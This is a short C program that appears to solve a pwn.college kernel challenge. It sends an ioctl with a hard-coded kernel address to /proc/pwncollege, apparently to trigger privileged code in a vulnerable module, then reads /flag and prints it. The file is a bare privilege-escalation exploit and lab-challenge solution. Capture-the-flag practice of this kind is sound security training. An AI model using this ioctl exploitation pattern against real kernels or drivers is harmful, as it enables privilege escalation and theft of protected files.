#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    int request_code = 0x539;
    long arg = 0xffffffffc000022d;

    if (ioctl(fd, request_code, arg) == -1) {
        perror("ioctl");
        return 1;
    }

    close(fd);

    fd = open("/flag", O_RDONLY);
    char buffer[64]; // Adjust buffer size as needed
    ssize_t bytes_read;
    while ((bytes_read = read(fd, buffer, sizeof(buffer))) > 0) {
        write(STDOUT_FILENO, buffer, bytes_read);
    }

    return 0;
}
